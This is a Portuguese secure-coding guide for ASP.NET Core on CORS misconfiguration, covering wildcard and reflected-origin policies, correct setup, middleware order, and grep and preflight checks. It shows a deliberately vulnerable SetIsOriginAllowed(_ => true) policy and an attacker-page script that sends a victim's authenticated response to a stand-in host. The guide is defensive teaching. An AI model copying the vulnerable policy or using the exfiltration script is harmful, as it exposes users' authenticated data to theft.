CORS restrito e por que AllowAnyOrigin é uma armadilha

Quase todo projeto tem uma política chamada "AllowAll" que nasceu para destravar o front em desenvolvimento e nunca mais foi revisada. O problema é que CORS não é um cadeado que você afrouxa: é a permissão que você dá para outros sites lerem as respostas da sua API.

ASP.NET Core 10 Leitura: ~11 min Nível: essencial

CORS não protege nada — ele desprotege com controle

Essa é a inversão que causa quase todos os erros do tema. O navegador já vem com a Same-Origin Policy ligada: por padrão, um script em https://site-do-atacante.tld não consegue ler a resposta de uma requisição feita para https://api.suaempresa.com.br. Você não precisa fazer nada para ter essa proteção.

O CORS existe para o caso contrário: quando você quer abrir uma exceção porque seu próprio SPA está em outro domínio. Cada método de configuração que você escreve é uma linha dizendo "esse site aqui pode ler minhas respostas". Por isso AllowAnyOrigin() não é uma configuração permissiva — é a remoção completa de uma proteção que o navegador te dava de graça.

O que o CORS controla é a leitura, não o envio

Como vimos no item 06, a requisição sai do navegador e é processada pelo servidor mesmo quando a política reprova. O bloqueio acontece depois, na hora de entregar a resposta ao script. É por isso que CORS não substitui antiforgery para escrita, e é por isso que CORS mal configurado vaza leitura de dados autenticados.

A política que todo mundo copia

Ela aparece com nomes diferentes — "AllowAll", "CorsPolicy", "Default" — mas o corpo é sempre este:

Program.csC#
builder.Services.AddCors(o =>
{
    o.AddPolicy("AllowAll", p => p
        .AllowAnyOrigin()
        .AllowAnyMethod()
        .AllowAnyHeader());
});

var app = builder.Build();
app.UseCors("AllowAll");

O que isso emite na resposta é Access-Control-Allow-Origin: *. Traduzindo: qualquer página, de qualquer domínio do mundo, pode fazer requisições para a sua API e ler o retorno.

Existe uma consolação — e ela é frágil. Com *, o navegador se recusa a enviar cookies e credenciais. Ou seja, o atacante consegue chamar a sua API, mas como visitante anônimo. Se todos os seus endpoints exigem autenticação (item 02), ele recebe 401 e o estrago é limitado a:

  • Endpoints públicos que retornam dados que você não queria expor em massa — listagens, catálogos, buscas.
  • APIs internas que confiam no fato de estarem "atrás da VPN" e não pedem token.
  • Endpoints que autenticam por IP de origem ou por header injetado por proxy — nesses, o navegador da vítima é a credencial.

É estreito, mas não é zero. E o buraco de verdade abre no passo seguinte, quando alguém precisa mandar cookie.

O combo que nem sequer funciona

O front começa a usar cookie de sessão, as chamadas quebram, e a correção óbvia é adicionar credenciais na política:

isso estoura em runtimeC#
p.AllowAnyOrigin()
 .AllowAnyMethod()
 .AllowAnyHeader()
 .AllowCredentials();   // InvalidOperationException

O ASP.NET Core recusa essa combinação com uma mensagem bem explícita:

exceçãolog
System.InvalidOperationException: The CORS protocol does not allow
specifying a wildcard (any) origin and credentials at the same time.
Configure the policy by listing individual origins if credentials
needs to be supported.

Não é frescura do framework: é a especificação do CORS. O navegador ignora uma resposta que traga Access-Control-Allow-Origin: * junto de Access-Control-Allow-Credentials: true. Permitir isso seria dar a qualquer site do mundo o direito de ler dados autenticados da vítima — exatamente o cenário que a Same-Origin Policy existe para impedir.

Aqui nasce a vulnerabilidade

Repare no que acabou de acontecer: o framework e o navegador barraram o desenvolvedor. A partir desse ponto, qualquer solução que "faça o AllowAll funcionar com cookie" é, por construção, uma forma de burlar a proteção. E é justamente essa a solução que a primeira resposta de qualquer fórum oferece.

A gambiarra que abre a porta

A saída que circula é trocar AllowAnyOrigin() por um predicado que aprova tudo. Compila, sobe, o front funciona, o ticket é fechado:

a linha mais perigosa deste guiaC#
p.SetIsOriginAllowed(_ => true)   // aprova qualquer origem
 .AllowAnyMethod()
 .AllowAnyHeader()
 .AllowCredentials();

A diferença técnica é sutil e o efeito é catastrófico. Como a origem agora é considerada "específica", o ASP.NET Core não emite mais o coringa: ele reflete de volta a origem que veio na requisição, com o aval de credenciais. O navegador, que barraria o *, aceita sem reclamar.

o que sai no fioHTTP
GET /api/faturas HTTP/1.1
Host: api.suaempresa.com.br
Origin: https://site-do-atacante.tld
Cookie: .AspNetCore.Identity.Application=CfDJ8...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://site-do-atacante.tld
Access-Control-Allow-Credentials: true

[{"cliente":"...","valor":18400.00,"documento":"..."}]

O ataque é uma página. A vítima logada no seu sistema visita qualquer site do atacante — um link no WhatsApp, um anúncio, um blog comprometido — e o script roda no navegador dela:

página do atacanteJS
const r = await fetch("https://api.suaempresa.com.br/api/faturas", {
  credentials: "include"          // vai com o cookie de sessão da vítima
});

await fetch("https://coleta.atacante.tld", {
  method: "POST",
  body: await r.text()    // exfiltra a resposta autenticada
});

Vale medir o tamanho disso. Não é um endpoint vazado: é toda a sua API, com a sessão da vítima, para qualquer site que ela visitar. Leitura de dados, e também escrita — porque com AllowAnyMethod e a origem refletida, o DELETE e o PUT passam pelo preflight tranquilamente. É a Same-Origin Policy desligada em uma linha.

Variações do mesmo erro

O predicado explícito é a versão honesta. Também são reflexo de origem: SetIsOriginAllowed(o => o.Contains("suaempresa")) — que aprova suaempresa.atacante.tld —, comparações com StartsWith — que aprovam https://suaempresa.com.br.atacante.tld — e middlewares caseiros que copiam o header Origin para Access-Control-Allow-Origin na resposta.

A configuração correta

Origens explícitas, vindas da configuração, com métodos e headers listados. A política vira parte do ambiente, não do código:

Program.csC#
var origens = builder.Configuration
    .GetSection("Cors:Origens").Get<string[]>()
    ?? throw new InvalidOperationException("Cors:Origens não configurado.");

builder.Services.AddCors(o =>
{
    o.AddPolicy("spa", p => p
        .WithOrigins(origens)
        .WithMethods("GET", "POST", "PUT", "DELETE")
        .WithHeaders("Content-Type", "Authorization", "X-CSRF-TOKEN")
        .WithExposedHeaders("X-Paginacao-Total")
        .AllowCredentials()
        .SetPreflightMaxAge(TimeSpan.FromMinutes(10)));
});
appsettings.Production.jsonJSON
{
  "Cors": {
    "Origens": [ "https://app.suaempresa.com.br" ]
  }
}

Três decisões nesse bloco merecem atenção:

  • Lançar exceção quando a configuração falta. Sem isso, um deploy com appsettings incompleto sobe com a lista vazia e o front quebra em produção de um jeito difícil de diagnosticar. Falhar no start é mais barato.
  • WithExposedHeaders para os headers que o SPA precisa ler. Por padrão o JavaScript só enxerga um punhado de headers de resposta. Header customizado de paginação, versão ou correlação precisa ser listado aqui — não é falha do fetch.
  • SetPreflightMaxAge para reduzir o OPTIONS. Cada requisição não-simples dispara um preflight; sem cache, é o dobro de idas ao servidor. Os navegadores impõem um teto próprio, então valores absurdos não ajudam.

Subdomínio: o coringa que dá para usar

Quando você realmente tem N subdomínios legítimos, existe suporte de primeira classe — bem diferente de escrever o seu próprio StartsWith:

Program.csC#
p.WithOrigins("https://*.suaempresa.com.br")
 .SetIsOriginAllowedToAllowWildcardSubdomains()

O coringa cobre um nível de subdomínio e o domínio-raiz continua fechado. Só considere isso se todos os subdomínios forem seus: em ambiente onde clientes recebem subdomínio próprio, ou onde existe upload de conteúdo em subdomínio separado, um XSS ali passa a valer para a API inteira.

A barra no final invalida a origem

WithOrigins("https://app.suaempresa.com.br/") — com barra — nunca casa com nada. A comparação é literal e o header Origin do navegador não traz barra final. O sintoma é cruel: a política parece configurada, o CORS falha, e alguém "resolve" voltando para o AllowAnyOrigin. Origem é esquema + host + porta, sem caminho e sem barra.

Origem não é domínio

Cada um desses é uma origem distinta e precisa entrar na lista separadamente se for legítimo:

OrigemCasa com https://app.contoso.com?
http://app.contoso.comNão — esquema diferente
https://app.contoso.com:8443Não — porta diferente
https://contoso.comNão — host diferente
https://outro.contoso.comNão — subdomínio não é herdado
nullNão, a menos que você liste "null" — e não liste

O último merece explicação. Navegadores enviam Origin: null em iframes com sandbox, em documentos abertos de file:// e em alguns redirecionamentos entre origens. Um atacante consegue produzir esse valor de propósito: basta hospedar um iframe sandboxed. Aceitar "null" na lista é o mesmo que aceitar qualquer um.

Onde o UseCors entra no pipeline

A ordem não é detalhe estético. O middleware precisa vir depois do roteamento e antes de autenticação e autorização:

Program.csC#
app.UseHttpsRedirection();
app.UseRouting();

app.UseCors("spa");        // depois de UseRouting

app.UseAuthentication();     // antes de auth
app.UseAuthorization();

app.MapControllers();

Fora dessa janela, os sintomas são clássicos e enganosos. Se o CORS vier depois da autorização, o preflight OPTIONS — que sai sem cookie e sem token, por definição — leva 401 antes de chegar no CORS, e o front reporta um erro de CORS que na verdade é de autenticação. Se vier antes do roteamento, políticas aplicadas por endpoint não são encontradas.

Antes do cache de resposta

UseCors também precisa vir antes de UseResponseCaching. Fora disso, uma resposta gerada para uma origem pode ser servida a outra a partir do cache. O mesmo raciocínio vale para o CDN ou proxy na frente da aplicação: quando a lista tem mais de uma origem, a resposta varia por Origin e a camada de cache precisa respeitar isso.

Uma política por escopo, não uma para tudo

Nem toda a API precisa da mesma abertura. Endpoints públicos de leitura podem ser liberados amplamente sem credenciais; o resto fica restrito ao seu SPA:

Program.csC#
o.AddPolicy("publico", p => p
    .AllowAnyOrigin()          // aceitável: sem credenciais, dado público
    .WithMethods("GET")
    .WithHeaders("Content-Type"));

// ...

app.MapGet("/api/catalogo", ListarCatalogo)
   .RequireCors("publico");

Em controllers, o equivalente são os atributos [EnableCors("publico")] e [DisableCors]. A regra de leitura é a mesma dos itens anteriores: o padrão global é o restritivo, e a abertura é explícita, visível em code review.

Sem cookie, sem AllowCredentials

Se o seu SPA autentica por token no header Authorization em vez de cookie de sessão, você não precisa de AllowCredentials — o token é enviado por código, não pelo navegador automaticamente. Isso elimina de uma vez a classe inteira de problemas deste artigo e também o CSRF do item 06. Em compensação, você passa a ter o problema de onde guardar esse token no cliente: localStorage é legível por qualquer XSS (item 05).

O que o CORS nunca vai fazer por você

Este é o ponto que mais gera falsa sensação de segurança. O CORS é uma regra que o navegador aplica. Qualquer cliente que não seja um navegador simplesmente ignora tudo isso:

terminalbash
# A política mais restritiva do mundo não impede isto:
curl https://api.suaempresa.com.br/api/faturas -H "Authorization: Bearer ..."

Curl, Postman, um script Python, o backend de outra empresa: nenhum deles verifica Access-Control-Allow-Origin. Não existe header algum que impeça um servidor de chamar o seu endpoint. Portanto:

  • CORS não é autorização. Quem pode ver o dado é decisão de autenticação e autorização, no servidor (item 02).
  • CORS não esconde uma API interna. Se ela não deve ser alcançável de fora, isso é rede, firewall ou gateway — não política de origem.
  • CORS não protege contra CSRF. Item 06, com o detalhe de que o próprio SetIsOriginAllowed(_ => true) desmonta a barreira acidental do preflight.

Como verificar

Primeiro o inventário. Estes quatro greps mostram, em segundos, se existe um buraco de origem no projeto:

terminalbash
# O coringa e o predicado que aprova tudo
grep -rn "AllowAnyOrigin\|SetIsOriginAllowed" --include="*.cs" .

# Onde credenciais são liberadas — cada ocorrência precisa de lista fechada
grep -rn "AllowCredentials" --include="*.cs" .

# Reflexo manual de origem em middleware caseiro
grep -rn "Access-Control-Allow-Origin" --include="*.cs" .

# Origens hardcoded que deveriam vir da configuração
grep -rn "WithOrigins" --include="*.cs" .

Depois, o teste que prova. Mande um preflight fingindo ser o atacante e olhe os headers que voltam:

PowerShellPOWERSHELL
$r = Invoke-WebRequest -Uri https://localhost:5001/api/faturas `
    -Method OPTIONS `
    -SkipHttpErrorCheck `
    -Headers @{
        "Origin"                         = "https://site-do-atacante.tld"
        "Access-Control-Request-Method" = "GET"
    }

$r.Headers["Access-Control-Allow-Origin"]
$r.Headers["Access-Control-Allow-Credentials"]
Resposta ao preflightVeredito
Nenhum header Access-Control-*Correto — a origem foi recusada
Allow-Origin: * e sem Allow-CredentialsAberto, porém anônimo — só aceitável em dado público
Allow-Origin: https://site-do-atacante.tldVulnerável — a origem está sendo refletida
Reflexo + Allow-Credentials: trueCrítico — corrija hoje

Rode esse teste contra produção, não só local. O caso mais comum de todos não é uma política errada: é a política de desenvolvimento que foi para o ar porque o AllowAll ficou fora do if (app.Environment.IsDevelopment()), ou porque o appsettings.Production.json herdou a lista permissiva do arquivo base.

Checklist

  • AllowAnyOrigin() não aparece em nenhuma política que envolva dados autenticados
  • SetIsOriginAllowed(_ => true) não existe no projeto — nem em variações com Contains ou StartsWith
  • Nenhum middleware caseiro copia o header Origin para a resposta
  • Origens listadas explicitamente em WithOrigins, sem barra no final
  • Lista de origens vem da configuração por ambiente, e a aplicação falha no start se ela estiver ausente
  • Política de desenvolvimento isolada dentro de IsDevelopment() e verificada em produção
  • AllowCredentials() só em política com lista fechada de origens
  • Métodos e headers listados com WithMethods / WithHeaders em vez de AllowAny*
  • Subdomínio coringa apenas via SetIsOriginAllowedToAllowWildcardSubdomains, e só se todos os subdomínios forem seus
  • "null" não está na lista de origens permitidas
  • UseCors depois de UseRouting, antes de UseAuthentication e de UseResponseCaching
  • Endpoints públicos usam política própria via RequireCors / [EnableCors], sem credenciais
  • Autorização de verdade nos endpoints — a segurança não depende do navegador respeitar a política
  • Teste de preflight com origem forjada rodando contra o ambiente de produção
